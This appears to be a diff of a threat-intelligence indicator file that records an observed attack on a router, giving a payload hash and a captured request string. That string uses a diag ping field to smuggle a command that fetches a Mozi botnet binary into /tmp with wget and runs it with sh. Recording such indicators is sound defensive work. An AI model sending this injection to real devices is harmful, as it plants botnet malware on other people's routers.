@@ -6,16 +6,16 @@
     "value": "hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+-"
   },
   {
-    "context": "Inbound payload hash (unknown)",
-    "source": "static_analysis",
-    "type": "hash",
-    "value": "5e997945f2696e835550c258d4ba67d6fdfc6daedd6af6f8f2bb05810c9b421a"
-  },
-  {
     "context": "Suspicious command in inbound payload",
     "source": "strings",
     "type": "command",
     "value": "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=``;wget+hxxp://[internal-ip-redacted]:8088/Mozi.m+-O+->/tmp/gpon80;sh+/t"
+  },
+  {
+    "context": "Inbound payload hash (unknown)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "5e997945f2696e835550c258d4ba67d6fdfc6daedd6af6f8f2bb05810c9b421a"
   },
   {
     "asn": "Cyber Internet Services (Pvt) Ltd.",
